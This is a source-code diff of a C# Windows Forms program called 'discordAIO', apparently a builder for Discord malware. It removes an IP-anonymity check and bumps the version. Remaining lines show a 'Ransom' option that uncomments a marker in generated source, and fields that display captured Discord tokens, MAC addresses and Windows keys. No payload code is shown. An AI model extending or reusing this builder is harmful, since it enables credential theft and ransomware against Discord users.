@@ -2,9 +2,6 @@
 using Leaf.xNet;
 using ScintillaNET;
 using System;
-using System.Collections.Generic;
-using System.ComponentModel;
-using System.Data;
 using System.Diagnostics;
 using System.Drawing;
 using System.Drawing.Drawing2D;
@@ -15,9 +12,7 @@ using System.Security.Cryptography;
 using System.Text;
 using System.Text.RegularExpressions;
 using System.Threading;
-using System.Threading.Tasks;
 using System.Windows.Forms;
-using System.Windows.Media.Imaging;
 
 // Made by Nyxon
 // Featuring yunglean_ and dv0l
@@ -27,8 +22,7 @@ namespace discordAIO
     public partial class main : Form
     {
 
-        private string version = "v0.5.1";
-        private protected string email = ""; // Your email goes here
+        private string version = "v0.5.2";
 
         // Do not touch
         private protected static string dAIOPass = "ceDUsRGbwAdcjUqHWkMLgARDrkx4hNJ28WbS6fPjr7cYQ87BKJTRFcUKRbJMMxeWDTEy3k9jsLSVFFV9heDeuWYfECHDzpmgYrttCMuLZRBtuPzuSJ846YBZhCa88Qj2fAaNJuuw6fhZBZfANEbRkXvaupN8rtDQVqrvLKnKW5ESAueQ2pz4QJnTdkDdM3rapFk9mU5DNP9MGAX8zymZW2MxLfj5C4p7PkPRYBxbTyawuQR9uaJZCr4bsSDhnCh2XT5CSUzHBFcVgWS7W5W9Z7SkUe4ehtymPawpwg58mpnN36sgWVSGeFXVzbQcXjfqjcUFcR8T2gBc6Ajm9wMjhCMgMNbmCMBjHKhcLghkeGWhw5wHWNZXhnDDFxnA8U4SzqdMkfTZCeaqTBaTASzKsRmGzeBGpdA9CHkLLxtJfxwj9LQ4vafzercmLJWPWGjpyeuM7CyN7ZgRbP9J6w4wzT3bxdtQXtm8RPVq5AKA6y66pSt5rdBaGbZxUjAHD2se";
@@ -52,40 +46,8 @@ namespace discordAIO
             this._randomChars = new RandomCharacters();
             this.randomFileInfo_0 = new RandomInfo(this.randomCharacters_0);
 
-        //    CheckProtection();  // Sth wrong
             Scintilla();
             DiscordRPC();
-        }
-
-        private void CheckProtection()
-        {
-            string ip = new WebClient().DownloadString("http://ipv4bot.whatismyipaddress.com/");
-
-            WebClient userIP = new WebClient();
-            string resposne = userIP.DownloadString("http://check.getipintel.net/check.php?ip=" + ip + "&contact=" + email + "&flags=m");
-
-            int responseNum = Int32.Parse(resposne);
-
-            if (responseNum < 1)
-            {
-                label2.Text = ip + " > unprotected";
-            } 
-            else if (responseNum == -5) {
-                MessageBox.Show("Error.\nContact email incorrect or blocked.", "Discord AIO");
-            }
-            else if (responseNum == -6)
-            {
-                MessageBox.Show("Error.\nContact email incorrect.", "Discord AIO");
-            }
-            else if (responseNum == -4)
-            {
-                MessageBox.Show("Error.\nUnable to reach database.\n\nProbably it is being updated.", "Discord AIO");
-            }
-            else
-            {
-                label2.Text = ip + " > protected";
-            }
-
         }
 
         protected void DiscordRPC()
@@ -113,7 +75,6 @@ namespace discordAIO
             scintilla1.Styles[Style.Default].Size = 10;
             scintilla1.Styles[Style.Default].BackColor = Color.Black;
             scintilla1.Styles[Style.Default].ForeColor = Color.DarkRed;
-
             scintilla1.StyleClearAll();
             scintilla1.Styles[Style.Cpp.Default].ForeColor = System.Drawing.Color.DarkRed;
             scintilla1.Styles[Style.Cpp.Comment].ForeColor = System.Drawing.Color.FromArgb(0, 128, 0);
@@ -746,7 +707,7 @@ namespace discordAIO
                             // Ransom
                             if (checkBox20.Checked)
                             {
-                            //    text = text.Replace("//imransomwr", ""); // TO DO
+                            //    text = text.Replace("//r4nsomw4reee", "");
                             }
 
                             bool obfuscationCheck = false;
@@ -881,6 +842,7 @@ namespace discordAIO
                 pictureBox4.BackColor = Color.FromArgb(dlg.Color.A, dlg.Color.R, dlg.Color.G, dlg.Color.B);
             }
         }
+
 
         // .dAIO
         private void button18_Click(object sender, EventArgs e)
@@ -1046,6 +1008,7 @@ namespace discordAIO
                         textBox12.Text = tokenData;
                         textBox11.Text = macData;
                         textBox13.Text = winkeyData;
+
 
                     }
                 }
